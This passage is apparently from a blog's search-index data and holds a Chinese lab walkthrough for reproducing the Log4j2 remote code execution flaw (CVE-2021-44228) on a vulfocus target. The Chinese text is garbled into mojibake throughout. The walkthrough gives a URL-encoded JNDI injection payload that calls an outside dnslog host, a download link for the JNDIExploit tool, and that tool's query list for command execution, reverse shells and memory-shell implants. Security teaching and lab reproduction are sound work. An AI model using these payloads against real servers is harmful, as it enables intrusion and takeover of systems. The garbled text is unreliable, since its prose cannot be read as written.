è§‚å¯Ÿcookieä¸­çš„sessionå­—æ®µï¼Œå¯èƒ½æŸäº›å­—æ®µæˆ–è€…å‚æ•°ä»£è¡¨èº«ä»½ï¼Œå°è¯•ä¿®æ”¹","categories":["å¸¸è§topæ¼æ´"]},{"title":"log4j2è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2021-44228ï¼‰","path":"/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/","content":"Apache log4j2 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç° 0x01 å‰è¨€ Apache log4j2 RCEæ¼æ´ï¼ˆCVE-2021-44228ï¼‰ä¸€å‡ºï¼Œå„å¤§è¡Œä¸šçŸ¥åå‚å•†çº·çº·ä¸­æ‹›ï¼Œä¸ä¹‹å‰çš„fastjsonã€shiroæ¼æ´ç›¸æ¯”æ›´ä¸ºä¸¥é‡ï¼Œé¢„è®¡åœ¨ä¹‹åçš„ä¸‰å››å¹´ä¸­æ¼æ´ä¼šä¸€ç›´å­˜åœ¨ã€‚æ­¤æ¼æ´å½±å“èŒƒå›´ç‰¹åˆ«å¹¿æ³›ï¼Œæ¼æ´åˆ©ç”¨é—¨æ§›ä½ï¼Œå±å®³ç¨‹åº¦éå¸¸å¤§ï¼Œå¦‚æœè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ï¼Œå±å®³ç¨‹åº¦ä¸äºšäº2017å¹´çˆ†å‘çš„â€œæ°¸æ’ä¹‹è“â€æ¼æ´ã€‚ä»¥ä¸‹å›¾ç‰‡æ¥æºäºç½‘ç»œ 0x02 æ¼æ´ç®€ä»‹ Apache Log4j2 æ˜¯ä¸€ä¸ªåŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚è¯¥å·¥å…·é‡å†™äº† Log4j æ¡†æ¶ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ ç”±äºLog4j2ç»„ä»¶åœ¨å¤„ç†ç¨‹åºæ—¥å¿—è®°å½•æ—¶å­˜åœ¨JNDIæ³¨å…¥ç¼ºé™·ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„æ•°æ®ï¼Œè§¦å‘Log4j2ç»„ä»¶è§£æç¼ºé™·ï¼Œå®ç°ç›®æ ‡æœåŠ¡å™¨çš„ä»»æ„ä»£ç æ‰§è¡Œï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨æƒé™ã€‚ æ¼æ´ç¼–å·ï¼šCVE-2021-44228 æ¼æ´ç­‰çº§ï¼šç´§æ€¥ CVSSè¯„åˆ†ï¼š10ï¼ˆæœ€é«˜çº§ï¼‰ å½±å“ç‰ˆæœ¬ï¼šApache log4j2 2.0 - 2.14.1 å®‰å…¨ç‰ˆæœ¬ï¼šApache log4j-2.15.0-rc2 æ›´å¤šå…³äºæ­¤æ¼æ´çš„è¯¦ç»†åˆ†æï¼šLog4jé«˜å±æ¼æ´ï¼å…·ä½“åŸå› è§£æï¼å…¨ç½‘ç¬¬ä¸€ 0x03 å½±å“èŒƒå›´ è¯¥æ¼æ´å½±å“èŒƒå›´æå¹¿ã€å±å®³æå¤§ï¼Œä¸»è¦ç”±äºè¯¥ç»„ä»¶åº”ç”¨èŒƒå›´ååˆ†å¹¿æ³›ï¼Œæ‰€æœ‰ä½¿ç”¨è¯¥ç»„ä»¶çš„æ‰€æœ‰äº§å“éƒ½ä¼šå—åˆ°æ¼æ´å½±å“ï¼Œå› æ­¤å¯¹å…¶ä¸‹æ¸¸é€ æˆçš„è½¯ä»¶ä¾›åº”é“¾å®‰å…¨éšæ‚£å·¨å¤§ã€‚ ç›®å‰å·²çŸ¥çš„å¯èƒ½å—å½±å“çš„åº”ç”¨åŠç»„ä»¶åŒ…æ‹¬ä½†ä¸é™äºå¦‚ä¸‹ï¼š ç»„ä»¶åç§° ç‰ˆæœ¬ä¿¡æ¯ Apache Struts2 å…¨ç‰ˆæœ¬ ElasticSearch 5.xï¼Œ6.xï¼Œ7.xï¼Œ8.0.0beta1ï¼Œ8.0.0alpha1å’Œ8.0.0alpha2 Logstash 5.0.0è‡³æœ€æ–° Apache Flink 1.11.0-rc1 åˆ° 1.14.0 Apache Druid 0.7.xä»¥ä¸Š Hadoop Hive 2.xå’Œ3.x Apache Log4j SLF4J Binding â€˜2.14.1â€™, â€˜2.14.0â€™, â€˜2.13.3â€™, â€˜2.13.2â€™, â€˜2.13.1â€™, â€˜2.13.0â€™, â€˜2.12.1â€™, â€˜2.12.0â€™, â€˜2.11.2â€™, â€˜2.11.1â€™, â€˜2.11.0â€™, â€˜2.10.0â€™, â€˜2.9.1â€™, â€˜2.9.0â€™, â€˜2.8.2â€™, â€˜2.8.1â€™, â€˜2.8â€™, â€˜2.7â€™, â€˜2.6.2â€™, â€˜2.6.1â€™, â€˜2.6â€™, â€˜2.5â€™, â€˜2.4.1â€™, â€˜2.4â€™, â€˜2.3â€™, â€˜2.2â€™, â€˜2.1â€™, â€˜2.0.2â€™, â€˜2.0.1â€™, â€˜2.0â€™, â€˜2.0-rc2â€™, â€˜2.0-rc1â€™, â€˜2.0-beta9â€™, â€˜2.0-beta8â€™, â€˜2.0-beta7â€™, â€˜2.0-beta6â€™, â€˜2.0-beta5â€™ Spring Boot â€˜2.6.1â€™, â€˜2.6.0â€™, â€˜2.5.7â€™, â€˜2.5.6â€™, â€˜2.5.5â€™, â€˜2.5.4â€™, â€˜2.5.3â€™, â€˜2.5.2â€™, â€˜2.5.1â€™, â€˜2.5.0â€™, â€˜2.4.13â€™, â€˜2.4.12â€™, â€˜2.4.11â€™, â€˜2.4.10â€™, â€˜2.4.9â€™, â€˜2.4.8â€™, â€˜2.4.7â€™, â€˜2.4.6â€™, â€˜2.4.5â€™, â€˜2.4.4â€™, â€˜2.4.3â€™, â€˜2.4.2â€™, â€˜2.4.1â€™, â€˜2.4.0â€™, â€˜2.3.12.RELEASEâ€™, â€˜2.3.11.RELEASEâ€™, â€˜2.3.10.RELEASEâ€™, â€˜2.3.9.RELEASEâ€™, â€˜2.3.8.RELEASEâ€™, â€˜2.3.7.RELEASEâ€™, â€˜2.3.6.RELEASEâ€™, â€˜2.3.5.RELEASEâ€™, â€˜2.3.4.RELEASEâ€™, â€˜2.3.3.RELEASEâ€™, â€˜2.3.2.RELEASEâ€™, â€˜2.3.1.RELEASEâ€™, â€˜2.3.0.RELEASEâ€™, â€˜2.2.13.RELEASEâ€™, â€˜2.2.12.RELEASEâ€™, â€˜2.2.11.RELEASEâ€™, â€˜2.2.10.RELEASEâ€™, â€˜2.2.9.RELEASEâ€™, â€˜2.2.8.RELEASEâ€™, â€˜2.2.7.RELEASEâ€™, â€˜2.2.6.RELEASEâ€™, â€˜2.2.5.RELEASEâ€™, â€˜2.2.4.RELEASEâ€™, â€˜2.2.3.RELEASEâ€™, â€˜2.2.2.RELEASEâ€™, â€˜2.2.1.RELEASEâ€™, â€˜2.2.0.RELEASEâ€™, â€˜2.1.18.RELEASEâ€™, â€˜2.1.17.RELEASEâ€™, â€˜2.1.16.RELEASEâ€™, â€˜2.1.15.RELEASEâ€™, â€˜2.1.14.RELEASEâ€™, â€˜2.1.13.RELEASEâ€™, â€˜2.1.12.RELEASEâ€™, â€˜2.1.11.RELEASEâ€™, â€˜2.1.10.RELEASEâ€™, â€˜2.1.9.RELEASEâ€™, â€˜2.1.8.RELEASEâ€™, â€˜2.1.7.RELEASEâ€™, â€˜2.1.6.RELEASEâ€™, â€˜2.1.5.RELEASEâ€™, â€˜2.1.4.RELEASEâ€™, â€˜2.1.3.RELEASEâ€™, â€˜2.1.2.RELEASEâ€™, â€˜2.1.1.RELEASEâ€™, â€˜2.1.0.RELEASEâ€™, â€˜2.0.9.RELEASEâ€™, â€˜2.0.8.RELEASEâ€™, â€˜2.0.7.RELEASEâ€™, â€˜2.0.6.RELEASEâ€™, â€˜2.0.5.RELEASEâ€™, â€˜2.0.4.RELEASEâ€™, â€˜2.0.3.RELEASEâ€™, â€˜2.0.2.RELEASEâ€™, â€˜2.0.1.RELEASEâ€™, â€˜2.0.0.RELEASEâ€™, â€˜1.5.22.RELEASEâ€™, â€˜1.5.21.RELEASEâ€™, â€˜1.5.20.RELEASEâ€™, â€˜1.5.19.RELEASEâ€™, â€˜1.5.18.RELEASEâ€™, â€˜1.5.17.RELEASEâ€™, â€˜1.5.16.RELEASEâ€™, â€˜1.5.15.RELEASEâ€™, â€˜1.5.14.RELEASEâ€™, â€˜1.5.13.RELEASEâ€™, â€˜1.5.12.RELEASEâ€™, â€˜1.5.11.RELEASEâ€™, â€˜1.5.10.RELEASEâ€™, â€˜1.5.9.RELEASEâ€™, â€˜1.5.8.RELEASEâ€™, â€˜1.5.7.RELEASEâ€™, â€˜1.5.6.RELEASEâ€™, â€˜1.5.5.RELEASEâ€™, â€˜1.5.4.RELEASEâ€™, â€˜1.5.3.RELEASEâ€™, â€˜1.5.2.RELEASEâ€™, â€˜1.5.1.RELEASEâ€™, â€˜1.5.0.RELEASEâ€™, â€˜1.4.7.RELEASEâ€™, â€˜1.4.6.RELEASEâ€™, â€˜1.4.5.RELEASEâ€™, â€˜1.4.4.RELEASEâ€™, â€˜1.4.3.RELEASEâ€™, â€˜1.4.2.RELEASEâ€™, â€˜1.4.1.RELEASEâ€™, â€˜1.4.0.RELEASEâ€™, â€˜1.3.8.RELEASEâ€™, â€˜1.3.7.RELEASEâ€™, â€˜1.3.6.RELEASEâ€™, â€˜1.3.5.RELEASEâ€™, â€˜1.3.4.RELEASEâ€™, â€˜1.3.3.RELEASEâ€™, â€˜1.3.2.RELEASEâ€™, â€˜1.3.1.RELEASEâ€™, â€˜1.3.0.RELEASEâ€™, â€˜1.2.8.RELEASEâ€™, â€˜1.2.7.RELEASEâ€™, â€˜1.2.6.RELEASEâ€™, â€˜1.2.5.RELEASEâ€™, â€˜1.2.4.RELEASEâ€™, â€˜1.2.3.RELEASEâ€™, â€˜1.2.2.RELEASEâ€™, â€˜1.2.1.RELEASEâ€™, â€˜1.2.0.RELEASEâ€™, â€˜1.1.12.RELEASEâ€™, â€˜1.1.11.RELEASEâ€™, â€˜1.1.10.RELEASEâ€™, â€˜1.1.9.RELEASEâ€™, â€˜1.1.8.RELEASEâ€™, â€˜1.1.7.RELEASEâ€™, â€˜1.1.6.RELEASEâ€™, â€˜1.1.5.RELEASEâ€™, â€˜1.1.4.RELEASEâ€™, â€˜1.1.3.RELEASEâ€™, â€˜1.1.2.RELEASEâ€™, â€˜1.1.1.RELEASEâ€™, â€˜1.1.0.RELEASEâ€™, â€˜1.0.2.RELEASEâ€™, â€˜1.0.1.RELEASEâ€™, â€˜1.0.0.RELEASEâ€™ Camel :: Core â€˜3.13.0â€™, â€˜3.12.0â€™, â€˜3.11.4â€™, â€˜3.11.3â€™, â€˜3.11.2â€™, â€˜3.11.1â€™, â€˜3.11.0â€™, â€˜3.10.0â€™, â€˜3.9.0â€™, â€˜3.8.0â€™, â€˜3.7.6â€™, â€˜3.7.5â€™, â€˜3.7.4â€™, â€˜3.7.3â€™, â€˜3.7.2â€™, â€˜3.7.1â€™, â€˜3.7.0â€™, â€˜3.6.0â€™, â€˜3.5.0â€™, â€˜3.4.6â€™, â€˜3.4.5â€™, â€˜3.4.4â€™, â€˜3.4.3â€™, â€˜3.4.2â€™, â€˜3.4.1â€™, â€˜3.4.0â€™, â€˜3.3.0â€™, â€˜3.2.0â€™, â€˜3.1.0â€™, â€˜3.0.1â€™, â€˜3.0.0â€™, â€˜2.25.4â€™, â€˜2.25.3â€™, â€˜2.25.2â€™, â€˜2.25.1â€™, â€˜2.25.0â€™, â€˜2.24.3â€™, â€˜2.24.2â€™, â€˜2.24.1â€™, â€˜2.24.0â€™, â€˜2.23.4â€™, â€˜2.23.3â€™, â€˜2.23.2â€™, â€˜2.23.1â€™, â€˜2.23.0â€™, â€˜2.22.5â€™, â€˜2.22.4â€™, â€˜2.22.3â€™, â€˜2.22.2â€™, â€˜2.22.1â€™, â€˜2.22.0â€™, â€˜2.21.5â€™, â€˜2.21.4â€™, â€˜2.21.3â€™, â€˜2.21.2â€™, â€˜2.21.1â€™, â€˜2.21.0â€™, â€˜2.20.4â€™, â€˜2.20.3â€™, â€˜2.20.2â€™, â€˜2.20.1â€™, â€˜2.20.0â€™, â€˜2.19.5â€™, â€˜2.19.4â€™, â€˜2.19.3â€™, â€˜2.19.2â€™, â€˜2.19.1â€™, â€˜2.19.0â€™, â€˜2.18.5â€™, â€˜2.18.4â€™, â€˜2.18.3â€™, â€˜2.18.2â€™, â€˜2.18.1â€™, â€˜2.18.0â€™, â€˜2.17.7â€™, â€˜2.17.6â€™, â€˜2.17.5â€™, â€˜2.17.4â€™, â€˜2.17.3â€™, â€˜2.17.2â€™, â€˜2.17.1â€™, â€˜2.17.0â€™, â€˜2.16.5â€™, â€˜2.16.4â€™, â€˜2.16.3â€™, â€˜2.16.2â€™, â€˜2.16.1â€™, â€˜2.16.0â€™, â€˜2.15.6â€™, â€˜2.15.5â€™, â€˜2.15.4â€™, â€˜2.15.3â€™, â€˜2.15.2â€™, â€˜2.15.1â€™, â€˜2.15.0â€™, â€˜2.14.4â€™, â€˜2.14.3â€™, â€˜2.14.2â€™, â€˜2.14.1â€™, â€˜2.14.0â€™, â€˜2.13.4â€™, â€˜2.13.3â€™, â€˜2.13.2â€™, â€˜2.13.1â€™, â€˜2.13.0â€™, â€˜2.12.5â€™, â€˜2.12.4â€™, â€˜2.12.3â€™, â€˜2.12.2â€™, â€˜2.12.1â€™, â€˜2.12.0â€™, â€˜2.11.4â€™, â€˜2.11.3â€™, â€˜2.11.2â€™, â€˜2.11.1â€™, â€˜2.11.0â€™, â€˜2.10.7â€™, â€˜2.10.6â€™, â€˜2.10.5â€™, â€˜2.10.4â€™, â€˜2.10.3â€™, â€˜2.10.2â€™, â€˜2.10.1â€™, â€˜2.10.0â€™, â€˜2.9.8â€™, â€˜2.9.7â€™, â€˜2.9.6â€™, â€˜2.9.5â€™, â€˜2.9.4â€™, â€˜2.9.3â€™, â€˜2.9.2â€™, â€˜2.9.1â€™, â€˜2.9.0â€™, â€˜2.8.6â€™, â€˜2.8.5â€™, â€˜2.8.4â€™, â€˜2.8.3â€™, â€˜2.8.2â€™, â€˜2.8.1â€™, â€˜2.8.0â€™, â€˜2.7.5â€™, â€˜2.7.4â€™, â€˜2.7.3â€™, â€˜2.7.2â€™, â€˜2.7.1â€™, â€˜2.7.0â€™, â€˜2.6.0â€™, â€˜2.5.0â€™, â€˜2.4.0â€™, â€˜2.3.0â€™, â€˜2.2.0â€™, â€˜2.1.0â€™, â€˜2.0.0â€™, â€˜1.6.4â€™, â€˜1.6.3â€™, â€˜1.6.2â€™, â€˜1.6.1â€™, â€˜1.6.0â€™, â€˜1.5.0â€™, â€˜1.4.0â€™, â€˜1.3.0â€™, â€˜1.2.0â€™, â€˜1.1.0â€™, â€˜1.0.0â€™, â€˜3.0.0-M4â€™, â€˜3.0.0-M3â€™, â€˜3.0.0-M2â€™, â€˜3.0.0-M1â€™, â€˜2.0-M3â€™, â€˜2.0-M2â€™, â€˜2.0-M1â€™, â€˜3.0.0-RC3â€™, â€˜3.0.0-RC2â€™, â€˜3.0.0-RC1â€™, â€˜2.9.0-RC1â€™ JUnit Vintage Engine â€˜5.8.2â€™, â€˜5.8.1â€™, â€˜5.8.0â€™, â€˜5.7.2â€™, â€˜5.7.1â€™, â€˜5.7.0â€™, â€˜5.6.3â€™, â€˜5.6.2â€™, â€˜5.6.1â€™, â€˜5.6.0â€™, â€˜5.5.2â€™, â€˜5.5.1â€™, â€˜5.5.0â€™, â€˜5.4.2â€™, â€˜5.4.1â€™, â€˜5.4.0â€™, â€˜5.3.2â€™, â€˜5.3.1â€™, â€˜5.3.0â€™, â€˜5.2.0â€™, â€˜5.1.1â€™, â€˜5.1.0â€™, â€˜4.12.3â€™, â€˜4.12.2â€™, â€˜4.12.1â€™, â€˜4.12.0â€™, â€˜5.8.0-M1â€™, â€˜5.7.0-M1â€™, â€˜5.6.0-M1â€™, â€˜5.5.0-M1â€™, â€˜5.4.0-M1â€™, â€˜5.3.0-M1â€™, â€˜5.2.0-M1â€™, â€˜5.1.0-M2â€™, â€˜5.1.0-M1â€™, â€˜4.12.0-M6â€™, â€˜4.12.0-M5â€™, â€˜4.12.0-M4â€™, â€˜4.12.0-M3â€™, â€˜4.12.0-M2â€™, â€˜4.12.0-M1â€™, â€˜5.8.0-RC1â€™, â€˜5.7.0-RC1â€™, â€˜5.6.0-RC1â€™, â€˜5.5.0-RC2â€™, â€˜5.5.0-RC1â€™, â€˜5.4.0-RC2â€™, â€˜5.4.0-RC1â€™, â€˜5.3.0-RC1â€™, â€˜5.2.0-RC1â€™, â€˜5.1.0-RC1â€™, â€˜4.12.0-RC3â€™, â€˜4.12.0-RC2â€™, â€˜4.12.0-RC1â€™ JBoss Logging 3 â€˜3.4.2.Finalâ€™, â€˜3.4.1.Finalâ€™, â€˜3.4.0.Finalâ€™, â€˜3.3.3.Finalâ€™, â€˜3.3.2.Finalâ€™, â€˜3.3.1.Finalâ€™, â€˜3.3.0.Finalâ€™, â€˜3.2.1.Finalâ€™, â€˜3.2.0.Finalâ€™, â€˜3.1.0.CR2â€™, â€˜3.1.0.CR1â€™, â€˜3.0.0.CR1â€™, â€˜3.3.0.Beta1â€™, â€˜3.2.0.Beta1â€™, â€˜3.1.0.Beta3â€™, â€˜3.1.0.Beta2â€™, â€˜3.1.0.Beta1â€™, â€˜3.0.0.Beta5â€™, â€˜3.0.0.Beta4â€™, â€˜3.0.0.Beta3â€™, â€˜3.0.0.Beta2â€™, â€˜3.0.0.Beta1â€™ HikariCP â€˜5.0.0â€™, â€˜4.0.3â€™, â€˜4.0.2â€™, â€˜4.0.1â€™, â€˜4.0.0â€™, â€˜3.4.5â€™, â€˜3.4.4â€™, â€˜3.4.3â€™, â€˜3.4.2â€™, â€˜3.4.1â€™, â€˜3.4.0â€™, â€˜3.3.1â€™, â€˜3.3.0â€™, â€˜3.2.0â€™, â€˜3.1.0â€™, â€˜3.0.0â€™, â€˜2.7.9â€™, â€˜2.7.8â€™, â€˜2.7.7â€™, â€˜2.7.6â€™, â€˜2.7.5â€™, â€˜2.7.4â€™, â€˜2.7.3â€™, â€˜2.7.2â€™, â€˜2.7.1â€™, â€˜2.7.0â€™, â€˜2.6.3â€™, â€˜2.6.2â€™, â€˜2.6.1â€™, â€˜2.6.0â€™, â€˜2.5.1â€™, â€˜2.5.0â€™, â€˜2.4.7â€™, â€˜2.4.6â€™, â€˜2.4.5â€™, â€˜2.4.4â€™, â€˜2.4.3â€™, â€˜2.4.2â€™, â€˜2.4.1â€™, â€˜2.4.0â€™, â€˜2.3.13â€™, â€˜2.3.12â€™, â€˜2.3.11â€™, â€˜2.3.10â€™, â€˜2.3.9â€™, â€˜2.3.8â€™, â€˜2.3.7â€™, â€˜2.3.6â€™, â€˜2.3.5â€™, â€˜2.3.4â€™, â€˜2.3.3â€™, â€˜2.3.2â€™, â€˜2.3.1â€™, â€˜2.3.0â€™, â€˜2.2.5â€™, â€˜2.2.4â€™, â€˜2.2.3â€™, â€˜2.2.2â€™, â€˜2.2.1â€™, â€˜2.2.0â€™, â€˜2.1.0â€™, â€˜2.0.1â€™, â€˜2.0.0â€™, â€˜1.4.0â€™, â€˜1.3.9â€™, â€˜1.3.8â€™, â€˜1.3.7â€™, â€˜1.3.6â€™, â€˜1.3.5â€™, â€˜1.3.4â€™, â€˜1.3.3â€™, â€˜1.3.2â€™, â€˜1.3.1â€™, â€˜1.3.0â€™, â€˜1.2.9â€™, â€˜1.2.8â€™, â€˜1.2.7â€™, â€˜1.2.6â€™, â€˜1.2.5â€™, â€˜1.2.4â€™, â€˜1.2.3â€™, â€˜1.2.2â€™, â€˜1.2.1â€™, â€˜1.1.9â€™, â€˜1.1.8â€™, â€˜1.1.7â€™, â€˜1.1.6â€™, â€˜1.1.5â€™, â€˜1.1.4â€™, â€˜1.1.3â€™ Logging â€˜1.1.0â€™, â€˜1.0.0â€™, â€˜0.6.0â€™, â€˜0.5.0â€™, â€˜0.4.1â€™, â€˜0.4.0â€™, â€˜0.3.1â€™, â€˜0.3.0â€™, â€˜0.2.6â€™, â€˜0.2.4â€™, â€˜0.2.3â€™, â€˜0.2.2â€™, â€˜0.2.0â€™, â€˜0.1.2â€™, â€˜0.1.1â€™, â€˜0.1.0â€™, â€˜0.5.0-alpha.1â€™, â€˜0.5.0-alphaâ€™ Jedis â€˜3.7.0â€™, â€˜3.6.3â€™, â€˜3.6.2â€™, â€˜3.6.1â€™, â€˜3.6.0â€™, â€˜3.5.2â€™, â€˜3.5.1â€™, â€˜3.5.0â€™, â€˜3.4.1â€™, â€˜3.4.0â€™, â€˜3.3.0â€™, â€˜3.2.0â€™, â€˜3.1.0â€™, â€˜3.0.1â€™, â€˜3.0.0â€™, â€˜2.10.2â€™, â€˜2.10.1â€™, â€˜2.10.0â€™, â€˜2.9.3â€™, â€˜2.9.2â€™, â€˜2.9.1â€™, â€˜2.9.0â€™, â€˜2.8.2â€™, â€˜2.8.1â€™, â€˜2.8.0â€™, â€˜2.7.3â€™, â€˜2.7.2â€™, â€˜2.7.1â€™, â€˜2.7.0â€™, â€˜2.6.3â€™, â€˜2.6.2â€™, â€˜2.6.1â€™, â€˜2.6.0â€™, â€˜2.5.2â€™, â€˜2.5.1â€™, â€˜2.5.0â€™, â€˜2.4.2â€™, â€˜2.4.1â€™, â€˜2.4.0â€™, â€˜2.3.1â€™, â€˜2.3.0â€™, â€˜2.2.1â€™, â€˜2.2.0â€™, â€˜2.1.0â€™, â€˜2.0.0â€™, â€˜1.5.2â€™, â€˜1.5.1â€™, â€˜1.5.0â€™, â€˜1.4.0â€™, â€˜1.3.1â€™, â€˜1.3.0â€™, â€˜jedis-3.6.2â€™, â€˜3.1.0-m4â€™, â€˜3.1.0-m3â€™, â€˜3.1.0-m2â€™, â€˜3.1.0-m1â€™, â€˜3.0.0-m1â€™, â€˜2.10.0-m1â€™, â€˜3.7.0-RC1â€™, â€˜3.6.0-RC1â€™, â€˜3.1.0-rc2â€™, â€˜3.1.0-rcâ€™, â€˜3.0.1-rc1â€™, â€˜3.0.0-rc1â€™, â€˜2.10.0-rc1â€™, â€˜1.5.0-RC2â€™, â€˜1.5.0-RC1â€™, â€˜4.0.0-beta4â€™, â€˜4.0.0-beta3â€™, â€˜4.0.0-beta2â€™, â€˜4.0.0-beta1â€™ WSO2 Carbon Kernel Core â€˜5.2.13â€™, â€˜5.2.8â€™, â€˜5.2.7â€™, â€˜5.2.6â€™, â€˜5.2.5â€™, â€˜5.2.4â€™, â€˜5.2.3â€™, â€˜5.2.2â€™, â€˜5.2.1â€™, â€˜4.6.2â€™, â€˜4.6.1â€™, â€˜4.6.0â€™, â€˜4.5.1â€™, â€˜4.4.37â€™, â€˜4.4.36â€™, â€˜4.4.35â€™, â€˜4.4.34â€™, â€˜4.4.33â€™, â€˜4.4.32â€™, â€˜4.4.31â€™, â€˜4.4.30â€™, â€˜4.4.29â€™, â€˜4.4.28â€™, â€˜4.4.27â€™, â€˜4.4.26â€™, â€˜4.4.25â€™, â€˜4.4.24â€™, â€˜4.4.23â€™, â€˜4.4.22â€™, â€˜4.4.21â€™, â€˜4.4.20â€™, â€˜4.4.19â€™, â€˜4.7.0-m6â€™, â€˜4.7.0-m5â€™, â€˜4.7.0-m4â€™, â€˜4.7.0-m3â€™, â€˜4.7.0-m2â€™, â€˜4.7.0-m1â€™, â€˜4.6.3-m5â€™, â€˜4.6.3-m4â€™, â€˜4.6.3-m3â€™, â€˜4.6.3-m2â€™, â€˜4.6.3-m1â€™, â€˜4.6.2-m9â€™, â€˜4.6.2-m8â€™, â€˜4.6.2-m7â€™, â€˜4.6.2-m6â€™, â€˜4.6.2-m5â€™, â€˜4.6.2-m4â€™, â€˜4.6.2-m3â€™, â€˜4.6.2-m2â€™, â€˜4.6.2-m1â€™, â€˜4.6.1-m8â€™, â€˜4.6.1-m7â€™, â€˜4.6.1-m6â€™, â€˜4.6.1-m5â€™, â€˜4.6.1-m4â€™, â€˜4.6.1-m3â€™, â€˜4.6.1-m2â€™, â€˜4.6.1-m1â€™, â€˜4.6.1-beta2â€™, â€˜4.6.1-betaâ€™, â€˜4.6.0-beta2â€™, â€˜4.6.1-alpha3â€™, â€˜4.6.1-alpha2â€™, â€˜4.6.1-alphaâ€™, â€˜4.6.0-alpha2â€™, â€˜4.6.0-alphaâ€™ ä»¥ä¸Šåº”ç”¨/ç»„ä»¶å—å½±å“ç‰ˆæœ¬ç»Ÿè®¡æ•°æ®æ¥è‡ªï¼šå¾®æ­¥æƒ…æŠ¥å±€ å¾®æ­¥åœ¨çº¿ç ”ç©¶å“åº”ä¸­å¿ƒ 0x04 æ¼æ´æ¼”ç¤º æ¼”ç¤ºé¶åœºé‡‡ç”¨vulfocusåœ¨çº¿å¹³å°çš„log4j2-rceé¶åœºï¼Œè¯¥é¶åœºæ¼æ´ä½ç½®å­˜åœ¨äº/helloè·¯å¾„ vulfocusçš„log4j2-rceé¶åœºçš„è¯·æ±‚æ•°æ®åŒ…å¦‚ä¸‹ï¼š GET /hello?payload=111 HTTP/1.1 Host: vulfocus.fofa.so:30861 Content-Type: application/x-www-form-urlencoded Content-Length: 147 æ¼æ´éªŒè¯è¿‡ç¨‹ä½¿ç”¨dnslogã€burpsuiteã€JNDIExploitä»¥åŠæ‹¥æœ‰å…¬ç½‘ipçš„vpsçš„æœåŠ¡å™¨ï¼Œå»ºè®®javaä¾èµ–ç¯å¢ƒé‡‡ç”¨jdk8u191ä»¥ä¸‹ç‰ˆæœ¬è¿›è¡Œå¤ç°ã€‚ dnslogï¼šhttp://www.dnslog.cn/ JNDIExploitï¼šhttps://github.com/feihong-cs/JNDIExploit jdk8ï¼šhttps://www.wmzhe.com/soft-70159.html 0x05 æ¼æ´æ£€æµ‹ 1. dnslogæ‰‹åŠ¨éªŒè¯ é¦–å…ˆåœ¨dnslogå¹³å°ç”Ÿæˆä¸€ä¸ªåœ°å€ï¼Œç„¶ååˆ©ç”¨è¯¥åœ°å€æ„é€ payloadè®©é¶æœºå¯¹dnslogå¹³å°å‘èµ·è¯·æ±‚ï¼š ä¼ å…¥payloadï¼špayload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D --è®°å¾—urlç¼–ç  è¯·æ±‚æˆåŠŸåï¼Œdnslogå¹³å°ç‚¹å‡» Refresh Record åä¼šæ¥æ”¶é¶æœºçš„è¯·æ±‚ï¼Œè®°å½•äº†é¶æœºçš„è¯·æ±‚çš„ipåœ°å€ä»¥åŠå“åº”æ—¶é—´ é€šè¿‡ä¸Šè¿°æ­¥éª¤éªŒè¯ï¼Œåœ¨æ¼”ç¤ºé¶åœºç¯å¢ƒä¸­å¯ä»¥ç¡®å®šæ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œä½†åœ¨çœŸå®ç¯å¢ƒä¸­åªèƒ½è¯´åˆæ­¥åˆ¤æ–­ç›®æ ‡æ˜¯æœ‰å¤§æ¦‚ç‡å­˜åœ¨æ¼æ´çš„ï¼Œç”±äºçœŸå®ç¯å¢ƒä¸­çš„ä¸€äº›å¤æ‚å› ç´ ï¼Œå³ä½¿dnslogè¯·æ±‚æˆåŠŸäº†ä¹Ÿä¸èƒ½å®Œå…¨ä¿è¯ç›®æ ‡ä¸€å®šå­˜åœ¨rceæ¼æ´ã€‚ 2. æ¼æ´åˆ©ç”¨ 1. JNDIExploit JNDIExploitæ˜¯ä¸€æ¬¾ç”¨äº JNDIæ³¨å…¥ åˆ©ç”¨çš„å·¥å…·ï¼Œå¤§é‡å‚è€ƒ/å¼•ç”¨äº† Rogue JNDI é¡¹ç›®çš„ä»£ç ï¼Œæ”¯æŒç›´æ¥æ¤å…¥å†…å­˜shellï¼Œå¹¶é›†æˆäº†å¸¸è§çš„bypass é«˜ç‰ˆæœ¬JDKçš„æ–¹å¼ï¼Œé€‚ç”¨äºä¸è‡ªåŠ¨åŒ–å·¥å…·é…åˆä½¿ç”¨ã€‚ ä¸‹è½½åœ°å€: https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q æå–ç : 5686 ä½¿ç”¨ java -jar JNDIExploit.jar -u æŸ¥çœ‹æ”¯æŒçš„ LDAP æ ¼å¼ Supported LADP Queries * all words are case INSENSITIVE when send to ldap server [+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g. ldap://127.0.0.1:1389/Basic/Dnslog/[domain] ldap://127.0.0.1:1389/Basic/Command/[cmd] ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/Basic/TomcatEcho ldap://127.0.0.1:1389/Basic/SpringEcho ldap://127.0.0.1:1389/Basic/WeblogicEcho ldap://127.0.0.1:1389/Basic/TomcatMemshell1 ldap://127.0.0.1:1389/Basic/TomcatMemshell2 ---need extra header [Shell: true] ldap://127.0.0.1:1389/Basic/JettyMemshell ldap://127.0.0.1:1389/Basic/WeblogicMemshell1 ldap://127.0.0.1:1389/Basic/WeblogicMemshell2 